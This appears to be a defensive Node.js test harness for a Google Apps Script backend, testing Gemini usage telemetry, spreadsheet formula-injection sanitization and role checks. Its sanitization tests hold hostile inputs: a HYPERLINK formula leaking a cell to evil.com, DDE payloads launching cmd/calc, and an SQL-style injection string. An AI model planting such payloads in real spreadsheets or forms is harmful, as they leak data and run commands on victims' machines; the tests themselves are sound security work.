/**
 * =========================================================================
 * EMPIRICAL ADVERSARIAL TEST HARNESS: TELEMETRY ACCURACY, CWE-1236 & RBAC
 * =========================================================================
 * Agent: m2_it2_challenger_2 (Security & Telemetry Challenger)
 * Target: google_apps_script_backend.js
 *
 * Verifications:
 * 1. getGeminiQuotaStatus strictly counts only SUCCESS with cachedFlag: true
 *    (Zero false positives from RATE_LIMITED, ERROR, or totalTokens: 0 rows)
 * 2. recordGeminiTokenUsageLog alias normalization & CWE-1236 sanitization
 * 3. RBAC strict rejection of unauthorized roles and injection vectors
 * 4. Non-mutating telemetry inspection invariant
 * =========================================================================
 */

const assert = require("assert");

// -------------------------------------------------------------------------
// Setup Mock SpreadsheetApp, LockService, and PropertiesService
// -------------------------------------------------------------------------
class MockRange {
  constructor(sheet, startRow, startCol, numRows = 1, numCols = 1) {
    this.sheet = sheet;
    this.startRow = startRow;
    this.startCol = startCol;
    this.numRows = numRows;
    this.numCols = numCols;
  }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontWeight() { return this; }
  setHorizontalAlignment() { return this; }
  setBorder() { return this; }
  setValue(val) {
    this.sheet._ensureSize(this.startRow, this.startCol);
    this.sheet.grid[this.startRow - 1][this.startCol - 1] = val;
    return this;
  }
  setValues(matrix) {
    for (let r = 0; r < matrix.length; r++) {
      for (let c = 0; c < matrix[r].length; c++) {
        const row = this.startRow + r;
        const col = this.startCol + c;
        this.sheet._ensureSize(row, col);
        this.sheet.grid[row - 1][col - 1] = matrix[r][c];
      }
    }
    return this;
  }
  getValues() {
    const result = [];
    for (let r = 0; r < this.numRows; r++) {
      const row = [];
      for (let c = 0; c < this.numCols; c++) {
        const rowIdx = this.startRow - 1 + r;
        const colIdx = this.startCol - 1 + c;
        const val = (this.sheet.grid[rowIdx] && this.sheet.grid[rowIdx][colIdx] !== undefined)
          ? this.sheet.grid[rowIdx][colIdx] : "";
        row.push(val);
      }
      result.push(row);
    }
    return result;
  }
}

class MockSheet {
  constructor(name) {
    this.name = name;
    this.grid = [];
    this.frozenRows = 0;
  }
  _ensureSize(r, c) {
    while (this.grid.length < r) this.grid.push([]);
    for (let i = 0; i < this.grid.length; i++) {
      while (this.grid[i].length < c) this.grid[i].push("");
    }
  }
  getName() { return this.name; }
  setName(n) { this.name = n; }
  getLastRow() { return this.grid.length; }
  getLastColumn() {
    let max = 0;
    this.grid.forEach(row => { if (row.length > max) max = row.length; });
    return max;
  }
  appendRow(rowArr) {
    this.grid.push([...rowArr]);
  }
  insertRowsBefore(beforeRow, count) {
    for (let i = 0; i < count; i++) {
      this.grid.splice(beforeRow - 1, 0, []);
    }
  }
  deleteRow(rowNumber) {
    this.grid.splice(rowNumber - 1, 1);
  }
  setFrozenRows(n) { this.frozenRows = n; }
  getRange(startRow, startCol, numRows = 1, numCols = 1) {
    return new MockRange(this, startRow, startCol, numRows, numCols);
  }
  getDataRange() {
    const numRows = Math.max(1, this.grid.length);
    let numCols = 1;
    this.grid.forEach(r => { if (r.length > numCols) numCols = r.length; });
    return new MockRange(this, 1, 1, numRows, numCols);
  }
}

class MockSpreadsheet {
  constructor() {
    this.sheets = [];
  }
  getSheetByName(name) {
    return this.sheets.find(s => s.name === name) || null;
  }
  insertSheet(name) {
    const s = new MockSheet(name);
    this.sheets.push(s);
    return s;
  }
}

const mockSpreadsheet = new MockSpreadsheet();

global.SpreadsheetApp = {
  getActiveSpreadsheet: () => mockSpreadsheet,
  BorderStyle: { SOLID: "SOLID" }
};

global.LockService = {
  getScriptLock: () => ({
    waitLock: () => true,
    releaseLock: () => true,
    tryLock: () => true
  })
};

let _mockProperties = {};
global.PropertiesService = {
  getScriptProperties: () => ({
    getProperty: (k) => _mockProperties[k] || null,
    setProperty: (k, v) => { _mockProperties[k] = String(v); },
    deleteProperty: (k) => { delete _mockProperties[k]; },
    deleteAllProperties: () => { _mockProperties = {}; }
  })
};

const backend = require("../google_apps_script_backend.js");

// Initialize in-memory tables
backend.initializeDatabase();

// -------------------------------------------------------------------------
// Test Runner Infrastructure
// -------------------------------------------------------------------------
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

function runTest(suite, testName, testFn) {
  totalTests++;
  try {
    testFn();
    passedTests++;
    console.log(`  [PASS] ${suite} > ${testName}`);
  } catch (err) {
    failedTests++;
    console.error(`  [FAIL] ${suite} > ${testName}: ${err.message}`);
    failures.push({ suite, testName, error: err.message, stack: err.stack });
  }
}

console.log("=========================================================================");
console.log("  EMPIRICAL ADVERSARIAL TELEMETRY, CWE-1236 & RBAC TEST HARNESS");
console.log("=========================================================================\n");

// =========================================================================
// SUITE 1: TELEMETRY ACCURACY & CACHE HIT STRICTNESS (getGeminiQuotaStatus)
// =========================================================================
console.log(">>> SUITE 1: Telemetry Accuracy & Cache Hit Strictness <<<");

runTest("Telemetry", "Adversarial Table 15 permutation matrix: strictly counts SUCCESS with cachedFlag: true", () => {
  // Clear any existing properties hits
  _mockProperties = {};
  if (backend._inMemoryScriptProperties) {
    backend._inMemoryScriptProperties.deleteAllProperties();
  }

  // Clear sheet GeminiTokenLogs
  const sheet = mockSpreadsheet.getSheetByName("GeminiTokenLogs");
  assert(sheet, "GeminiTokenLogs sheet must exist");
  // Keep header row
  const headers = sheet.grid[0];
  sheet.grid = [headers];

  // 26 Adversarially Crafted Test Rows directly appended to Table 15
  const testMatrix = [
    // Non-hits: RATE_LIMITED rows (must NEVER be counted as cache hit, even with 0 tokens or cachedFlag)
    { status: "RATE_LIMITED", cachedFlag: false, totalTokens: 0, desc: "RATE_LIMITED with cachedFlag: false and 0 tokens" },
    { status: "RATE_LIMITED", cachedFlag: true, totalTokens: 0, desc: "RATE_LIMITED with cachedFlag: true and 0 tokens" },
    { status: "RATE_LIMITED", cachedFlag: "true", totalTokens: 0, desc: "RATE_LIMITED with string cachedFlag: 'true'" },
    { status: "RATE_LIMITED", cachedFlag: "TRUE", totalTokens: 0, desc: "RATE_LIMITED with uppercase string cachedFlag: 'TRUE'" },

    // Non-hits: ERROR / FAILED / TIMEOUT rows (must NEVER be counted as cache hit)
    { status: "ERROR", cachedFlag: false, totalTokens: 0, desc: "ERROR with cachedFlag: false and 0 tokens" },
    { status: "ERROR", cachedFlag: true, totalTokens: 0, desc: "ERROR with cachedFlag: true and 0 tokens" },
    { status: "FAILED", cachedFlag: true, totalTokens: 0, desc: "FAILED with cachedFlag: true and 0 tokens" },
    { status: "TIMEOUT", cachedFlag: true, totalTokens: 0, desc: "TIMEOUT with cachedFlag: true and 0 tokens" },

    // Non-hits: SUCCESS rows that are NOT cached
    // Crucial: row with totalTokens: 0 but cachedFlag: false must NOT be counted as cache hit!
    { status: "SUCCESS", cachedFlag: false, totalTokens: 0, desc: "SUCCESS with 0 tokens but cachedFlag: false (critical anti-false-positive check)" },
    { status: "SUCCESS", cachedFlag: false, totalTokens: 500, desc: "SUCCESS normal API call with 500 tokens, cachedFlag: false" },
    { status: "SUCCESS", cachedFlag: "false", totalTokens: 0, desc: "SUCCESS with string cachedFlag: 'false' and 0 tokens" },
    { status: "SUCCESS", cachedFlag: null, totalTokens: 0, desc: "SUCCESS with null cachedFlag and 0 tokens" },
    { status: "SUCCESS", cachedFlag: undefined, totalTokens: 0, desc: "SUCCESS with undefined cachedFlag and 0 tokens" },
    { status: "SUCCESS", cachedFlag: 0, totalTokens: 0, desc: "SUCCESS with numeric 0 cachedFlag" },
    { status: "SUCCESS", cachedFlag: 1, totalTokens: 0, desc: "SUCCESS with numeric 1 cachedFlag (non-boolean)" },
    { status: "SUCCESS", cachedFlag: "1", totalTokens: 0, desc: "SUCCESS with string '1' cachedFlag" },
    { status: "SUCCESS", cachedFlag: "yes", totalTokens: 0, desc: "SUCCESS with string 'yes' cachedFlag" },

    // Non-hits: Missing, empty, or non-SUCCESS status
    { status: "", cachedFlag: true, totalTokens: 0, desc: "Blank status with cachedFlag: true" },
    { status: null, cachedFlag: true, totalTokens: 0, desc: "null status with cachedFlag: true" },
    { status: undefined, cachedFlag: true, totalTokens: 0, desc: "undefined status with cachedFlag: true" },
    { status: "PENDING", cachedFlag: true, totalTokens: 0, desc: "PENDING status with cachedFlag: true" },

    // GENUINE CACHE HITS: Exactly 5 direct sheet rows
    { status: "SUCCESS", cachedFlag: true, totalTokens: 0, desc: "Genuine hit 1: SUCCESS with boolean cachedFlag: true" },
    { status: "SUCCESS", cachedFlag: "true", totalTokens: 0, desc: "Genuine hit 2: SUCCESS with string cachedFlag: 'true'" },
    { status: "SUCCESS", cachedFlag: "TRUE", totalTokens: 0, desc: "Genuine hit 3: SUCCESS with uppercase cachedFlag: 'TRUE'" },
    { status: "success", cachedFlag: true, totalTokens: 0, desc: "Genuine hit 4: lowercase status 'success' with cachedFlag: true" },
    { status: "Success", cachedFlag: true, totalTokens: 0, desc: "Genuine hit 5: mixed-case status 'Success' with cachedFlag: true" }
  ];

  for (let i = 0; i < testMatrix.length; i++) {
    const item = testMatrix[i];
    backend.appendSheetRecord("GeminiTokenLogs", {
      id: "tok_test_" + (i + 1),
      timestamp: new Date().toISOString(),
      adminUserId: "u_adm_demo",
      model: "gemini-1.5-flash",
      grade: "Class 5",
      subject: "Science",
      topic: "Energy",
      questionType: "MCQ",
      quantity: 5,
      promptTokens: 0,
      candidateTokens: 0,
      totalTokens: item.totalTokens,
      cachedFlag: item.cachedFlag,
      status: item.status,
      latencyMs: 10
    });
  }

  const quota = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });

  assert.strictEqual(quota.success, true, "getGeminiQuotaStatus must succeed for valid admin");
  assert.strictEqual(quota.totalCallsLogged, 26, `Expected totalCallsLogged === 26, got ${quota.totalCallsLogged}`);
  assert.strictEqual(quota.totalTokensLogged, 500, `Expected totalTokensLogged === 500, got ${quota.totalTokensLogged}`);
  assert.strictEqual(quota.cacheHitCount, 5, `CRITICAL: Expected cacheHitCount === 5, got ${quota.cacheHitCount}. False positives or false negatives detected!`);
});

runTest("Telemetry", "recordGeminiTokenUsageLog normalizes cached / isCached aliases to cachedFlag: true", () => {
  // Test that recordGeminiTokenUsageLog correctly writes to cachedFlag column
  const aliasLog1 = backend.recordGeminiTokenUsageLog({
    adminUserId: "u_adm_demo",
    model: "gemini-1.5-flash",
    grade: "Class 6",
    subject: "Science",
    topic: "Motion",
    questionType: "MCQ",
    status: "SUCCESS",
    totalTokens: 0,
    cached: true
  });
  assert.strictEqual(aliasLog1.cachedFlag, true, "cached: true must normalize to cachedFlag: true");

  const aliasLog2 = backend.recordGeminiTokenUsageLog({
    adminUserId: "u_adm_demo",
    model: "gemini-1.5-flash",
    grade: "Class 6",
    subject: "Science",
    topic: "Motion",
    questionType: "MCQ",
    status: "SUCCESS",
    totalTokens: 0,
    isCached: true
  });
  assert.strictEqual(aliasLog2.cachedFlag, true, "isCached: true must normalize to cachedFlag: true");

  const aliasLog3 = backend.recordGeminiTokenUsageLog({
    adminUserId: "u_adm_demo",
    model: "gemini-1.5-flash",
    grade: "Class 6",
    subject: "Science",
    topic: "Motion",
    questionType: "MCQ",
    status: "SUCCESS",
    totalTokens: 0,
    cachedFlag: true
  });
  assert.strictEqual(aliasLog3.cachedFlag, true, "cachedFlag: true must be preserved");

  // Query quota status again: previous 5 hits + 3 new normalized hits = 8 hits
  const updatedQuota = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
  assert.strictEqual(updatedQuota.cacheHitCount, 8, `Expected cacheHitCount === 8, got ${updatedQuota.cacheHitCount}`);
  assert.strictEqual(updatedQuota.totalCallsLogged, 29, `Expected totalCallsLogged === 29, got ${updatedQuota.totalCallsLogged}`);
});

runTest("Telemetry", "Dual-tier cacheHitCount arbitration between Table 15 and PropertiesService", () => {
  // Table 15 currently has 8 genuine hits
  // Case A: PropertiesService has 5 (less than sheet 8) -> should return 8
  _mockProperties["gemini_cache_hits_count"] = "5";
  let q = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
  assert.strictEqual(q.cacheHitCount, 8, `Expected max(8, 5) === 8, got ${q.cacheHitCount}`);

  // Case B: PropertiesService has 20 (greater than sheet 8) -> should return 20
  _mockProperties["gemini_cache_hits_count"] = "20";
  q = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
  assert.strictEqual(q.cacheHitCount, 20, `Expected max(8, 20) === 20, got ${q.cacheHitCount}`);

  // Case C: PropertiesService has non-numeric garbage -> should gracefully return 8
  _mockProperties["gemini_cache_hits_count"] = "corrupted_garbage_NaN";
  q = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
  assert.strictEqual(q.cacheHitCount, 8, `Expected graceful fallback to 8, got ${q.cacheHitCount}`);

  // Cleanup
  delete _mockProperties["gemini_cache_hits_count"];
});

runTest("Telemetry", "Empty GeminiTokenLogs table telemetry returns exact 0 counters", () => {
  _mockProperties = {};
  const sheet = mockSpreadsheet.getSheetByName("GeminiTokenLogs");
  const headers = sheet.grid[0];
  sheet.grid = [headers]; // Clear all rows

  const q = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
  assert.strictEqual(q.success, true);
  assert.strictEqual(q.totalCallsLogged, 0);
  assert.strictEqual(q.totalTokensLogged, 0);
  assert.strictEqual(q.cacheHitCount, 0);
});

// =========================================================================
// SUITE 2: CWE-1236 FORMULA SANITIZATION IN recordGeminiTokenUsageLog
// =========================================================================
console.log("\n>>> SUITE 2: CWE-1236 Formula Sanitization in recordGeminiTokenUsageLog <<<");

runTest("CWE-1236", "recordGeminiTokenUsageLog neutralizes formula triggers on all string columns", () => {
  const dangerousVectors = [
    { field: "adminUserId", val: "=HYPERLINK(\"http://evil.com/leak?q=\"&A1, \"Click\")" },
    { field: "model", val: "+calc|' /C calc.exe'!A0" },
    { field: "grade", val: "-Class 10 - cmd|' /C calc'!A0" },
    { field: "subject", val: "@SUM(1, 999)" },
    { field: "topic", val: "\t=1+1" },
    { field: "questionType", val: "\r=1+1" },
    { field: "status", val: "   =ERROR_CMD" }
  ];

  for (const vec of dangerousVectors) {
    const payload = {
      adminUserId: "u_adm_demo",
      model: "gemini-1.5-flash",
      grade: "Class 5",
      subject: "Science",
      topic: "Atoms",
      questionType: "MCQ",
      status: "SUCCESS",
      quantity: 5,
      promptTokens: 10,
      candidateTokens: 20,
      totalTokens: 30,
      cachedFlag: false,
      latencyMs: 15
    };
    payload[vec.field] = vec.val;

    const logged = backend.recordGeminiTokenUsageLog(payload);
    const sanitizedVal = logged[vec.field];

    assert(
      typeof sanitizedVal === "string" && sanitizedVal.startsWith("'"),
      `Field ${vec.field} with input ${JSON.stringify(vec.val)} was NOT sanitized. Output: ${JSON.stringify(sanitizedVal)}`
    );
  }
});

runTest("CWE-1236", "recordGeminiTokenUsageLog preserves non-formula strings and data types", () => {
  const benignPayload = {
    adminUserId: "u_adm_demo",
    model: "gemini-1.5-flash",
    grade: "Class 7",
    subject: "Mathematics",
    topic: "Linear Equations",
    questionType: "MCQ",
    status: "SUCCESS",
    quantity: 10,
    promptTokens: 125,
    candidateTokens: 350,
    totalTokens: 475,
    cachedFlag: true,
    latencyMs: 42
  };

  const logged = backend.recordGeminiTokenUsageLog(benignPayload);

  // Strings must NOT have leading single quote if benign
  assert.strictEqual(logged.adminUserId, "u_adm_demo");
  assert.strictEqual(logged.model, "gemini-1.5-flash");
  assert.strictEqual(logged.grade, "Class 7");
  assert.strictEqual(logged.subject, "Mathematics");
  assert.strictEqual(logged.topic, "Linear Equations");
  assert.strictEqual(logged.questionType, "MCQ");
  assert.strictEqual(logged.status, "SUCCESS");

  // Numeric fields must remain pure numbers
  assert.strictEqual(typeof logged.quantity, "number");
  assert.strictEqual(logged.quantity, 10);
  assert.strictEqual(typeof logged.promptTokens, "number");
  assert.strictEqual(logged.promptTokens, 125);
  assert.strictEqual(typeof logged.candidateTokens, "number");
  assert.strictEqual(logged.candidateTokens, 350);
  assert.strictEqual(typeof logged.totalTokens, "number");
  assert.strictEqual(logged.totalTokens, 475);
  assert.strictEqual(typeof logged.latencyMs, "number");
  assert.strictEqual(logged.latencyMs, 42);

  // Boolean cachedFlag must remain boolean
  assert.strictEqual(typeof logged.cachedFlag, "boolean");
  assert.strictEqual(logged.cachedFlag, true);
});

runTest("CWE-1236", "Physical sheet insertion in Table 15 GeminiTokenLogs contains sanitized cells", () => {
  const sheet = mockSpreadsheet.getSheetByName("GeminiTokenLogs");
  const initialRowCount = sheet.getLastRow();

  const attackEntry = {
    adminUserId: "=DDE('cmd';'/C calc';'test')",
    model: "+gemini-pro-pwn",
    grade: "=Class 10",
    subject: "@EvilSubject",
    topic: "-ExploitTopic",
    questionType: "+MCQ_ATTACK",
    status: "=INJECT",
    quantity: 5,
    promptTokens: 50,
    candidateTokens: 100,
    totalTokens: 150,
    cachedFlag: false,
    latencyMs: 25
  };

  backend.recordGeminiTokenUsageLog(attackEntry);

  const finalRowCount = sheet.getLastRow();
  assert.strictEqual(finalRowCount, initialRowCount + 1, "Row must be appended to GeminiTokenLogs sheet");

  const headers = sheet.grid[0];
  const lastRow = sheet.grid[finalRowCount - 1];

  const adminColIdx = headers.indexOf("adminUserId");
  const modelColIdx = headers.indexOf("model");
  const gradeColIdx = headers.indexOf("grade");
  const subjectColIdx = headers.indexOf("subject");
  const topicColIdx = headers.indexOf("topic");
  const qTypeColIdx = headers.indexOf("questionType");
  const statusColIdx = headers.indexOf("status");

  assert(lastRow[adminColIdx].startsWith("'="), `adminUserId in sheet not sanitized: ${lastRow[adminColIdx]}`);
  assert(lastRow[modelColIdx].startsWith("'+"), `model in sheet not sanitized: ${lastRow[modelColIdx]}`);
  assert(lastRow[gradeColIdx].startsWith("'="), `grade in sheet not sanitized: ${lastRow[gradeColIdx]}`);
  assert(lastRow[subjectColIdx].startsWith("'@"), `subject in sheet not sanitized: ${lastRow[subjectColIdx]}`);
  assert(lastRow[topicColIdx].startsWith("'-"), `topic in sheet not sanitized: ${lastRow[topicColIdx]}`);
  assert(lastRow[qTypeColIdx].startsWith("'+"), `questionType in sheet not sanitized: ${lastRow[qTypeColIdx]}`);
  assert(lastRow[statusColIdx].startsWith("'="), `status in sheet not sanitized: ${lastRow[statusColIdx]}`);
});

// =========================================================================
// SUITE 3: RBAC ENFORCEMENT & PERMISSION RESISTANCE
// =========================================================================
console.log("\n>>> SUITE 3: RBAC Enforcement & Identity Boundary Testing <<<");

const rbacVectors = [
  { val: undefined, desc: "undefined adminUserId" },
  { val: null, desc: "null adminUserId" },
  { val: "", desc: "empty string adminUserId" },
  { val: "   ", desc: "whitespace-only adminUserId" },
  { val: "u_nonexistent_9999", desc: "nonexistent user ID" },
  { val: "u_stu_divyank", desc: "student user ID (u_stu_divyank)" },
  { val: "u_par_demo", desc: "parent user ID (u_par_demo)" },
  { val: 12345, desc: "numeric user ID" },
  { val: true, desc: "boolean user ID" },
  { val: { role: "admin", id: "u_adm_demo" }, desc: "object prototype injection" },
  { val: ["u_stu_divyank"], desc: "student array-wrapped user ID" },
  { val: ["u_adm_attacker"], desc: "non-admin array-wrapped user ID" },
  { val: "u_adm_demo' OR '1'='1", desc: "SQL-style string injection" }
];

for (const vec of rbacVectors) {
  runTest("RBAC", `getGeminiQuotaStatus strictly rejects ${vec.desc} with HTTP 403`, () => {
    const res = backend.getGeminiQuotaStatus({ adminUserId: vec.val });
    assert.strictEqual(res.success, false, `Expected failure for ${vec.desc}`);
    assert.strictEqual(res.code, 403, `Expected code 403 for ${vec.desc}`);
    assert(res.error && res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED message for ${vec.desc}`);
  });

  runTest("RBAC", `generateCurriculumQuestionsWithGemini strictly rejects ${vec.desc} with HTTP 403`, () => {
    const res = backend.generateCurriculumQuestionsWithGemini({ adminUserId: vec.val });
    assert.strictEqual(res.success, false, `Expected failure for ${vec.desc}`);
    assert.strictEqual(res.code, 403, `Expected code 403 for ${vec.desc}`);
    assert(res.error && res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED message for ${vec.desc}`);
  });
}

runTest("RBAC", "Legitimate admin (u_adm_demo) is authorized for getGeminiQuotaStatus", () => {
  const res = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
  assert.strictEqual(res.success, true);
  assert.strictEqual(res.model, "gemini-1.5-flash");
});

// =========================================================================
// SUITE 4: NON-MUTATING TELEMETRY INSPECTION INVARIANT
// =========================================================================
console.log("\n>>> SUITE 4: Non-Mutating Telemetry Inspection Invariant <<<");

runTest("NonMutating", "Burst invocations of getGeminiQuotaStatus do NOT consume quota or mutate rate limit counters", () => {
  const initialStatus = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
  assert.strictEqual(initialStatus.success, true);
  const initialRpmCurrent = initialStatus.rpmCurrent;
  const initialRpmRemaining = initialStatus.rpmRemaining;
  const initialRpdCurrent = initialStatus.rpdCurrent;
  const initialRpdRemaining = initialStatus.rpdRemaining;

  // Execute 30 rapid consecutive status inquiries (exceeding 15 RPM limit if mutating)
  for (let i = 0; i < 30; i++) {
    const statusIter = backend.getGeminiQuotaStatus({ adminUserId: "u_adm_demo" });
    assert.strictEqual(statusIter.success, true, `Iteration ${i + 1} must succeed`);
    assert.strictEqual(statusIter.rpmCurrent, initialRpmCurrent, `rpmCurrent mutated at iteration ${i + 1}`);
    assert.strictEqual(statusIter.rpmRemaining, initialRpmRemaining, `rpmRemaining mutated at iteration ${i + 1}`);
    assert.strictEqual(statusIter.rpdCurrent, initialRpdCurrent, `rpdCurrent mutated at iteration ${i + 1}`);
    assert.strictEqual(statusIter.rpdRemaining, initialRpdRemaining, `rpdRemaining mutated at iteration ${i + 1}`);
  }
});

// =========================================================================
// SUMMARY & EXIT
// =========================================================================
console.log("\n=========================================================================");
console.log(`TOTAL EMPIRICAL CHALLENGER TESTS: ${totalTests} | PASSED: ${passedTests} | FAILED: ${failedTests}`);
console.log("=========================================================================\n");

if (failedTests > 0) {
  console.error("ADVERSARIAL FAILURES FOUND:");
  failures.forEach(f => console.error(`  - [${f.suite}] ${f.testName}: ${f.error}`));
  process.exit(1);
} else {
  console.log("ALL EMPIRICAL CHALLENGER VERIFICATIONS PASSED WITH 100% SUCCESS!");
  process.exit(0);
}
